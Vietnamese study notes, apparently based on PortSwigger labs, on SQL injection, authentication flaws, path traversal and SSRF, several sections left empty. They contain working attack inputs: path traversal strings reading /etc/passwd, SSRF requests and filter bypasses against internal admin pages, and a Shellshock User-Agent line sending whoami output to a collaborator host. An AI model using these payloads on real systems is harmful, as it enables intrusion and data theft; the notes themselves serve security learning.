# Server-side topics

## **SQL injection**

SQL SQL (SQLi) là một lỗ hổng bảo mật web cho phép kẻ tấn công can thiệp vào các truy vấn mà ứng dụng thực hiện đối với cơ sở dữ liệu của nó cho phép kẻ tấn công xem dữ liệu mà thông thường chúng không thể truy xuất được trong 1 số trường hợp có thể là sửa và xóa dữ liệu. Dữ liệu truy xuất có thể bao gồm dữ liệu thuộc về người dùng khác hoặc bất kỳ dữ liệu nào khác mà ứng dụng có thể truy cập

- **Cách phát hiện lỗ hổng SQL**
    - Ký tự trích dẫn đơn `'` và tìm kiếm lỗi hoặc các điểm bất thường khác.
    - Một số cú pháp dành riêng cho SQL đánh giá giá trị cơ sở (gốc) của điểm nhập và một giá trị khác, đồng thời tìm kiếm sự khác biệt mang tính hệ thống trong các phản hồi của ứng dụng.
    - Các điều kiện Boolean như `OR 1=1 OR 1=2`và tìm kiếm sự khác biệt trong phản hồi của ứng dụng.
    - Tải trọng được thiết kế để kích hoạt độ trễ thời gian khi được thực thi trong truy vấn SQL và tìm kiếm sự khác biệt về thời gian cần thiết để phản hồi.
    - [Tải trọng OAST](https://portswigger.net/burp/application-security-testing/oast) được thiết kế để kích hoạt tương tác mạng ngoài băng tần khi được thực thi trong truy vấn SQL và giám sát mọi tương tác phát sinh.
- 

## **Authentication vulnerabilities**

Lỗ hổng xác thực có thể cho phép kẻ tấn công truy cập vào dữ liệu và chức năng nhạy cảm. Họ cũng phơi bày bề mặt tấn công bổ sung để khai thác thêm

- **Xác thực là gì?**
    
    Xác thực là quá trình xác minh danh tính của người dùng hoặc khách hàng. Các trang web có khả năng bị lộ cho bất kỳ ai kết nối với Internet
    
    ba loại xác thực chính:
    
    - Thông tin nào đó bạn **biết**, chẳng hạn như mật khẩu hoặc câu trả lời cho câu hỏi bảo mật. Đôi khi chúng được gọi là "yếu tố kiến thức".
    - Thứ bạn **có**, Đây là một vật thể vật lý như điện thoại di động hoặc mã thông báo bảo mật. Đôi khi chúng được gọi là "yếu tố sở hữu".
    - Một cái gì đó bạn **đang** hoặc làm. Ví dụ: sinh trắc học hoặc mô hình hành vi của bạn. Đôi khi chúng được gọi là "yếu tố vốn có".
    
    Xác thực là quá trình xác minh rằng người dùng chính là người mà họ tuyên bố. Việc ủy quyền liên quan đến việc xác minh xem người dùng có được phép làm điều gì đó hay không
    
- **Nguyên nhân tác động**
    
    Nguyên nhân:
    
    - Các cơ chế xác thực yếu vì chúng không thể bảo vệ đầy đủ trước các cuộc tấn công vũ phu.
    - Lỗi logic hoặc mã hóa kém trong quá trình triển khai cho phép kẻ tấn công bỏ qua hoàn toàn các cơ chế xác thực. Điều này đôi khi được gọi là "xác thực bị hỏng".
    
    Tác động: 
    
    - Kẻ tấn công bỏ qua xác thực hoặc đột nhập vào tài khoản của người dùng khác, chúng có quyền truy cập vào tất cả dữ liệu và chức năng mà tài khoản bị xâm phạm có.
- **Lỗ hổng xác thực**
    
    Phân loại lỗ hổng trong cơ chế xác thực: 
    
    - **Password-based login**
        - **Brute-force attacks**
            
            Tấn công brute-force là khi kẻ tấn công sử dụng hệ thống thử và sai để đoán thông tin đăng nhập hợp lệ của người dùng. Cuộc tấn công này thường được tự động hóa bằng cách sử dụng danh sách từ gồm tên người dùng và mật khẩu. Bằng cách sử dụng logic cơ bản hoặc kiến thức có sẵn công khai, những kẻ tấn công có thể tinh chỉnh các cuộc tấn công vũ phu để đưa ra những phỏng đoán có cơ sở hơn nhiều.
            
            1. **Brute-forcing usernames:**  Tên người dùng đặc biệt dễ đoán nếu chúng tuân theo một mẫu có thể nhận dạng được, chẳng hạn như địa chỉ email. Tuy nhiên, ngay cả khi không có mẫu rõ ràng, đôi khi ngay cả những tài khoản có đặc quyền cao cũng được tạo bằng tên người dùng có thể dự đoán được, chẳng hạn như `admin`hoặc `administrator`. Trong quá trình kiểm tra, hãy kiểm tra xem trang web có tiết lộ công khai tên người dùng tiềm năng hay không. 
            2. **Brute-forcing passwords:** mật khẩu có độ khó thay đổi tùy theo độ mạnh của mật khẩu. Nhiều trang web áp dụng một số hình thức chính sách mật khẩu, buộc người dùng phải tạo mật khẩu có độ entropy cao, ít nhất về mặt lý thuyết, khó bị bẻ khóa hơn chỉ bằng cách sử dụng vũ lực. Điều này thường liên quan đến việc thực thi mật khẩu với: số lượng ký tự tối thiểu, kết hợp giữa chữ thường và chữ hoa, ít nhất một ký tự đặc biệt
            3. **Username enumeration:**  
            
            Trong khi cố gắng ép buộc một trang đăng nhập, bạn nên đặc biệt chú ý đến bất kỳ sự khác biệt nào về:
            
            - **Mã trạng thái**
                
                Trong một cuộc tấn công vũ phu, mã trạng thái HTTP được trả về có thể giống nhau đối với phần lớn các dự đoán vì hầu hết chúng đều sai. Nếu dự đoán trả về một mã trạng thái khác thì đây là dấu hiệu rõ ràng rằng tên người dùng đã đúng. Cách tốt nhất là các trang web luôn trả về cùng một mã trạng thái bất kể kết quả ra sao, nhưng cách làm này không phải lúc nào cũng được tuân theo.
                
            - **Thông báo lỗi**
                
                Đôi khi thông báo lỗi trả về khác nhau tùy thuộc vào việc cả tên người dùng VÀ mật khẩu đều sai hay chỉ sai mật khẩu. Cách tốt nhất là các trang web nên sử dụng thông báo chung, giống hệt nhau trong cả hai trường hợp, nhưng đôi khi có những lỗi đánh máy nhỏ. Chỉ cần một ký tự sai vị trí cũng khiến hai thông báo trở nên khác biệt, ngay cả trong trường hợp ký tự đó không hiển thị trên trang được hiển thị.
                
            - **Thời gian phản hồi**
                
                Nếu hầu hết các yêu cầu được xử lý với thời gian phản hồi tương tự nhau thì bất kỳ yêu cầu nào khác với điều này đều cho thấy rằng có điều gì đó khác biệt đang xảy ra đằng sau hậu trường. Đây là một dấu hiệu khác cho thấy tên người dùng được đoán có thể đúng. Ví dụ: một trang web chỉ có thể kiểm tra xem mật khẩu có đúng hay không nếu tên người dùng hợp lệ. Bước bổ sung này có thể làm tăng nhẹ thời gian phản hồi. Điều này có thể tinh vi, nhưng kẻ tấn công có thể làm cho sự chậm trễ này trở nên rõ ràng hơn bằng cách nhập mật khẩu quá dài khiến trang web mất nhiều thời gian hơn để xử lý
                
                —> các bài lab dựa trên  sự khác biệt trên 
                
        - **Flawed brute-force protection**
            
            Hai cách phổ biến nhất để ngăn chặn các cuộc tấn công vũ phu là:
            
            - Khóa tài khoản mà người dùng từ xa đang cố truy cập nếu họ đăng nhập thất bại quá nhiều lần
            - Chặn địa chỉ IP của người dùng từ xa nếu họ thực hiện quá nhiều lần đăng nhập liên tiếp
            
            VD: 
            
            - Đôi khi bạn có thể thấy rằng IP của mình bị chặn nếu bạn không đăng nhập quá nhiều lần. Trong một số triển khai, bộ đếm số lần thử không thành công sẽ được đặt lại nếu chủ sở hữu IP đăng nhập thành công. Điều này có nghĩa là kẻ tấn công chỉ cần đăng nhập vào tài khoản của chính họ sau mỗi vài lần thử để ngăn chặn việc đạt đến giới hạn này.
            - Khóa tài khoản: khi thử tối đa mk 1 số lần nhất định sẽ thông báo khóa mk điều này  có thể giúp kẻ tấn công liệt kê danh sách người dùng tồn tại
            - Vì giới hạn này dựa trên tốc độ yêu cầu HTTP được gửi từ địa chỉ IP của người dùng nên đôi khi bạn cũng có thể vượt qua biện pháp bảo vệ này nếu bạn có thể tìm ra cách đoán nhiều mật khẩu chỉ bằng một yêu cầu.
    - **Multi-factor authentication**
        
        Ngày càng phổ biến việc thấy cả xác thực hai yếu tố bắt buộc và tùy chọn (2FA) dựa trên **những điều bạn biết** và **những điều bạn có** . Điều này thường yêu cầu người dùng nhập cả mật khẩu truyền thống và mã xác minh tạm thời từ thiết bị vật lý ngoài băng tần mà họ sở hữu.
        
        Mã thông báo xác thực hai yếu tố có thể bị bắt chặn hoặc lấy thiết bị vật lý
        
        **Bỏ qua xác thực hai yếu tố:**
        
        - Đôi khi, việc triển khai xác thực hai yếu tố có sai sót đến mức có thể bỏ qua hoàn toàn, trang web không thực sự kiểm tra xem bạn có hoàn thành bước thứ hai trước khi tải trang hay không
        - Lỗi logic khi xác thực:  sau khi người dùng hoàn thành bước đăng nhập ban đầu, trang web không xác minh đầy đủ rằng chính người dùng đó đang hoàn thành bước thứ hai. Kẻ tấn công có thể đăng nhập bằng thông tin đăng nhập của riêng họ nhưng sau đó thay đổi giá trị của `account`cookie thành bất kỳ tên người dùng tùy ý nào khi gửi mã xác minh.
        - Brute-forcing 2FA: vì mã thường là số đơn giản có 4 hoặc 6 chữ số. Nếu không có sự bảo vệ mạnh mẽ đầy đủ thì việc bẻ khóa một mã như vậy là chuyện nhỏ.(sử dụng **Macro Recorder** khi bị đẩy ra do đoán sai mã )
    - **Other authentication mechanisms**
        - Giữ người dùng đăng nhập
            
            Chức năng thực hiện bằng cách lưu trữ trong một cookie liên tục.—>tạo 1 tài khoản phân tích cookie đó được mã hóa như thế nào . Ngoài ra có thể đánh cắp cookie bằng nhiều thủ thuật như xss,.. 
            
        - Đặt Lại Mật Khẩu
        - Thay Đổi Mật Khẩu

## **Path traversal**

Truyền tải đường dẫn còn được gọi là truyền tải thư mục. Những lỗ hổng này cho phép kẻ tấn công đọc các tệp tùy ý trên máy chủ đang chạy ứng dụng. Điều này có thể bao gồm:

- Mã ứng dụng và dữ liệu.
- Thông tin xác thực cho hệ thống back-end.
- Các tập tin hệ điều hành nhạy cảm.

Trong một số trường hợp, kẻ tấn công có thể ghi vào các tệp tùy ý trên máy chủ, cho phép chúng sửa đổi dữ liệu hoặc hành vi của ứng dụng và cuối cùng chiếm toàn quyền kiểm soát máy chủ.

- **Đọc các tập tin tùy ý thông qua truyền tải đường dẫn**
    
    vd tải hình ảnh bằng HTML sau:
    
    ```
    <img src="/loadImage?filename=218.png"
    ```
    
    URL `loadImage`nhận `filename`tham số và trả về nội dung của tệp được chỉ định. Các tập tin hình ảnh được lưu trữ trên đĩa ở vị trí `/var/www/images/`. Để trả về một hình ảnh, ứng dụng sẽ thêm tên tệp được yêu cầu vào thư mục cơ sở này và sử dụng API hệ thống tệp để đọc nội dung của tệp. Nói cách khác, ứng dụng đọc từ đường dẫn tệp sau:
    
    ```
    /var/www/images/218.png
    ```
    
    Ứng dụng này không thực hiện biện pháp phòng vệ nào trước các cuộc tấn công truyền tải đường dẫn. Do đó, kẻ tấn công có thể yêu cầu URL sau để lấy `/etc/passwd`tệp từ hệ thống tệp của máy chủ:
    
    ```
    https://insecure-website.com/loadImage?filename=../../../etc/passwd
    ```
    
    Điều này khiến ứng dụng đọc từ đường dẫn tệp sau:
    
    ```
    /var/www/images/../../../etc/passwd
    ```
    
    Trình tự này `../`hợp lệ trong đường dẫn tệp và có nghĩa là tăng lên một cấp trong cấu trúc thư mục. Ba `../`chuỗi liên tiếp tăng dần từ `/var/www/images/`gốc hệ thống tập tin và do đó, tập tin thực sự được đọc là:
    
    ```
    /etc/passwd
    ```
    
    Trên Windows, cả hai `../`đều `..\`là các chuỗi truyền tải thư mục hợp lệ. Sau đây là ví dụ về một cuộc tấn công tương đương nhằm vào máy chủ chạy Windows:
    
    ```
    https://insecure-website.com/loadImage?filename=..\..\..\windows\win.ini
    ```
    
- **Lỗ hổng truyền tải đường dẫn**
    
    Nhiều ứng dụng đặt đầu vào của người dùng vào đường dẫn tệp sẽ triển khai các biện pháp bảo vệ chống lại các cuộc tấn công truyền tải đường dẫn. Những điều này thường có thể được bỏ qua.
    
    Nếu một ứng dụng loại bỏ hoặc chặn các chuỗi truyền tải thư mục khỏi tên tệp do người dùng cung cấp, thì ứng dụng đó có thể vượt qua hệ thống phòng thủ bằng nhiều kỹ thuật khác nhau.
    
    - Sử dụng đường dẫn tuyệt đối từ gốc hệ thống tệp `filename=/etc/passwd`
    - Sử dụng các chuỗi truyền tải lồng nhau, chẳng hạn như `....//`hoặc `....\/`
    - Sử dụng mã hóa URL hoặc thậm chí mã hóa URL kép, các `../`ký tự. Điều này dẫn đến `%2e%2e%2f`và `%252e%252e%252f`tương ứng. Các mã hóa không chuẩn khác nhau, chẳng hạn như `..%c0%af`hoặc `..%ef%bc%8f`, cũng có thể hoạt động.—>tham chiếu `filename=..%252f..%252f..%252fetc/passwd`
    - Sử dụng thư mục cơ sở cần thiết theo sau là các trình tự duyệt phù hợp. Ví dụ: `filename=/var/www/images/../../../etc/passwd`
    - Sử dụng byte rỗng để chấm dứt hiệu quả đường dẫn tệp trước phần mở rộng được yêu cầu. Ví dụ: `filename=../../../etc/passwd%00.png`
    - lab
        
        hoàn toàn giống những kĩ thuật được nêu trên
        

## **OS command injection**

## **Business logic vulnerabilities**

## **Information disclosure vulnerabilities**

## **Access control vulnerabilities and privilege escalation**

## **File upload vulnerabilities**

## **Race conditions**

## **Server-side request forgery (SSRF)**

là một lỗ hổng bảo mật web cho phép kẻ tấn công khiến ứng dụng phía máy chủ thực hiện các yêu cầu đến một vị trí ngoài ý muốn. VD: kẻ tấn công có thể khiến máy chủ tạo kết nối với các dịch vụ chỉ dành cho nội bộ trong cơ sở hạ tầng của tổ chức hay buộc máy chủ kết nối với các hệ thống bên ngoài tùy ý.

Hậu quả: 

- Dẫn đến các hành động trái phép hoặc truy cập dữ liệu trong tổ chức
- Cho phép kẻ tấn công thực hiện lệnh tùy ý

Các kiểu tấn công SSRF phổ biến

- **SSRF phía máy chủ**
    
    Là cuộc tấn công SSRF nhằm vào máy chủ, kẻ tấn công khiến ứng dụng thực hiện yêu cầu HTTP quay lại máy chủ đang lưu trữ ứng dụng, thông qua giao diện mạng vòng lặp của nó
    
    Cung cấp URL có tên máy chủ như `127.0.0.1` (IP  trỏ đến bộ điều hợp loopback) hoặc 
    
    `localhost`(tên thường dùng cho cùng cho bộ điều hợp)
    
    VD: Khi người dùng xem trạng thái tồn kho của một mặt hàng, trình duyệt của họ sẽ đưa ra yêu cầu sau:
    
    ```
    POST /product/stock HTTP/1.0
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 118
    
    stockApi=http://stock.weliketoshop.net:8080/product/stock/check%3FproductId%3D6%26storeId%3D1
    ```
    
    Máy chủ sẽ truy xuất trạng thái tồn kho và trả lại trạng thái này cho người dùng.
    
    Kẻ tấn công có thể sửa đổi yêu cầu chỉ định URL cục bộ cho máy chủ:
    
    ```
    POST /product/stock HTTP/1.0
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 118
    
    stockApi=http://localhost/admin
    ```
    
    Máy chủ tìm nạp nội dung của `/admin`URL và trả lại cho người dùng
    
    Nếu yêu cầu tới `/admin`URL đến từ máy cục bộ thì các biện pháp kiểm soát truy cập thông thường sẽ bị bỏ qua. Ứng dụng cấp quyền truy cập đầy đủ vào chức năng quản trị vì yêu cầu dường như bắt nguồn từ một vị trí đáng tin cậy.
    
    Nguyên nhân ứng dụng ngầm tin tưởng các yêu cầu đến từ máy cục bộ:
    
    - Việc kiểm tra kiểm soát truy cập có thể được triển khai trong một thành phần khác nằm phía trước máy chủ ứng dụng. Khi kết nối được thực hiện trở lại máy chủ, việc kiểm tra sẽ bị bỏ qua.
    - Với mục đích khắc phục thảm họa, ứng dụng có thể cho phép truy cập quản trị mà không cần đăng nhập đối với bất kỳ người dùng nào đến từ máy cục bộ. Điều này cung cấp một cách để quản trị viên khôi phục hệ thống nếu họ mất thông tin đăng nhập. Điều này giả định rằng chỉ người dùng hoàn toàn đáng tin cậy mới đến trực tiếp từ máy chủ.
    - Giao diện quản trị có thể nghe trên một số cổng khác với ứng dụng chính và người dùng có thể không truy cập trực tiếp được.
    
- **SSRF chống lại hệ thống backend**
    
    Trong 1 số trường hợp máy chủ ứng dụng có thể tương tác với các hệ thống backend mà người dùng không thể truy cập trực tiếp. Các hệ thống này thường có địa chỉ IP riêng không thể định tuyến
    
    tương tự như phía máy chủ những kĩ thuật sử dụng ở đây là dùng ip để dò ra ip khi có dải mạng rồi chỉ cần brute-force 0-255
    
    Kẻ tấn công có thể gửi yêu cầu sau để khai thác lỗ hổng SSRF và truy cập vào giao diện quản trị:
    
    ```
    POST /product/stock HTTP/1.0
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 118
    
    stockApi=http://192.168.0.68/admin
    ```
    

**Phá vỡ các biện pháp phòng thủ SSRF** 

- **Dựa trên danh sách đen**
    
    Một số ứng dụng chặn đầu vào có chứa tên máy chủ như `127.0.0.1`và `localhost`hoặc các URL nhạy cảm như `/admin`. Trong tình huống này, bạn thường có thể phá vỡ bộ lọc bằng các kỹ thuật sau:
    
    - Sử dụng biểu diễn IP thay thế của `127.0.0.1` , chẳng hạn như`2130706433, 017700000001`, hoặc`127.1`
    - Đăng ký tên miền của riêng bạn có độ phân giải thành `127.0.0.1`  Bạn có thể sử dụng `spoofed.burpcollaborator.net` cho mục đích này.
    - Làm xáo trộn các chuỗi bị chặn bằng cách sử dụng mã hóa URL hoặc biến thể chữ hoa chữ thường. (thường là chữ đầu tiên admin —> ‘a’)
    - Cung cấp URL mà bạn kiểm soát, URL này sẽ chuyển hướng đến URL mục tiêu. Hãy thử sử dụng các mã chuyển hướng khác nhau cũng như các giao thức khác nhau cho URL mục tiêu. Ví dụ: việc chuyển từ URL `http:` sang`https:` URL trong quá trình chuyển hướng đã được chứng minh là bỏ qua một số bộ lọc chống SSRF.
- **Dựa trên danh sách trắng**
    - Có thể nhúng thông tin xác thực vào URL trước tên máy chủ, sử dụng `@`ký tự. Ví dụ:`https://expected-host:fakepassword@evil-host`
    - Có thể sử dụng `#`ký tự này để biểu thị một đoạn URL. Ví dụ:`https://evil-host#expected-host`
    - Có thể tận dụng hệ thống phân cấp đặt tên DNS để đặt thông tin đầu vào bắt buộc vào tên DNS đủ điều kiện mà bạn kiểm soát. Ví dụ:`https://expected-host.evil-host`
    - Có thể mã hóa các ký tự URL để gây nhầm lẫn cho mã phân tích cú pháp URL. Điều này đặc biệt hữu ích nếu mã triển khai bộ lọc xử lý các ký tự được mã hóa URL khác với mã thực hiện yêu cầu HTTP phía sau. Bạn cũng có thể thử mã hóa kép
        
        các ký tự; một số máy chủ giải mã URL đệ quy đầu vào mà chúng nhận được, điều này có thể dẫn đến sự khác biệt hơn nữa.
        
    - Có thể sử dụng kết hợp các kỹ thuật này với nhau
    
    ctf phần này http://localhost:80%2523@stock.weliketoshop.net cdùng kí tự #@ mã hóa # 
    
- **Dựa trên chuyển hướng mở**
    
     API được sử dụng để thực hiện yêu cầu HTTP phía sau hỗ trợ chuyển hướng, bạn có thể tạo một URL đáp ứng bộ lọc và dẫn đến yêu cầu được chuyển hướng đến mục tiêu phía sau mong muốn.
    
    Ví dụ: ứng dụng chứa lỗ hổng chuyển hướng mở trong đó URL sau:
    
    ```
    /product/nextProduct?currentProductId=6&path=http://evil-user.net
    ```
    
    trả về một chuyển hướng đến:
    
    ```
    http://evil-user.net
    ```
    
    Bạn có thể tận dụng lỗ hổng chuyển hướng mở để vượt qua bộ lọc URL và khai thác lỗ hổng SSRF như sau:
    
    ```
    POST /product/stock HTTP/1.0
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 118
    
    stockApi=http://weliketoshop.net/product/nextProduct?currentProductId=6&path=http://192.168.0.68/admin
    ```
    
    Việc khai thác SSRF này hoạt động vì trước tiên ứng dụng xác thực rằng `stockAPI`URL được cung cấp nằm trên một miền được phép. Sau đó, ứng dụng sẽ yêu cầu URL được cung cấp để kích hoạt chuyển hướng mở
    
    ctf phần này : /product/nextProduct?currentProductId=2&path=http://192.168.0.12:8080/admin/delete?username=carlos
    
    lợi dụng việc có thể điều hướng  bởi next sản phẩm (sử dụng bắt chặn trên burpsuite) có thể điều hướng ra bên ngoài và dùng để điều hướng tới trang admin bằng stockAPI
    

**Blind SSRF**

Lỗ hổng SSRF mù xảy ra nếu bạn có thể khiến ứng dụng đưa ra yêu cầu HTTP back-end tới một URL được cung cấp nhưng phản hồi từ yêu cầu back-end không được trả về trong phản hồi front-end của ứng dụng.

**khai thác :**

- Nhận biết bằng cách sử dụng subdomain của collaborators ping ra xem có bắt được ko
- Sửa User-Agent thành () { :; }; /usr/bin/nslookup $(whoami).BURP-COLLABORATOR-SUBDOMAIN
- Cuối cùng vén cạn ip bằng dải ip nạn nhân ví dụ Referer: http://192.168.0.§1§:8080/

**Tìm bề mặt tấn công ẩn**

- **URL một phần trong yêu cầu**

Đôi khi, ứng dụng chỉ đặt tên máy chủ hoặc một phần đường dẫn URL vào tham số yêu cầu. Sau đó, giá trị được gửi sẽ được kết hợp phía máy chủ vào một URL đầy đủ được yêu cầu. Nếu giá trị được nhận dạng dễ dàng dưới dạng tên máy chủ hoặc đường dẫn URL thì bề mặt tấn công tiềm ẩn có thể rõ ràng. Tuy nhiên, khả năng khai thác dưới dạng SSRF đầy đủ có thể bị hạn chế do bạn không kiểm soát toàn bộ URL được yêu cầu.

- **URL trong các định dạng dữ liệu**

Một số ứng dụng truyền dữ liệu ở các định dạng có thông số kỹ thuật cho phép bao gồm các URL có thể được trình phân tích cú pháp dữ liệu yêu cầu đối với định dạng đó. Một ví dụ rõ ràng về điều này là định dạng dữ liệu XML, định dạng này đã được sử dụng rộng rãi trong các ứng dụng web để truyền dữ liệu có cấu trúc từ máy khách đến máy chủ. Khi một ứng dụng chấp nhận dữ liệu ở định dạng XML và phân tích cú pháp dữ liệu đó, nó có thể dễ bị [tiêm XXE](https://portswigger.net/web-security/xxe) .

- **SSRF thông qua tiêu đề Người giới thiệu**

Một số ứng dụng sử dụng phần mềm phân tích phía máy chủ để theo dõi khách truy cập. Phần mềm này thường ghi lại tiêu đề Người giới thiệu trong các yêu cầu để có thể theo dõi các liên kết đến. Thông thường, phần mềm phân tích sẽ truy cập bất kỳ URL nào của bên thứ ba xuất hiện trong tiêu đề Người giới thiệu. Điều này thường được thực hiện để phân tích nội dung của các trang web giới thiệu, bao gồm cả văn bản liên kết được sử dụng trong các liên kết đến.

## **XML external entity (XXE) injection**

## **NoSQL injection**

## **API testing**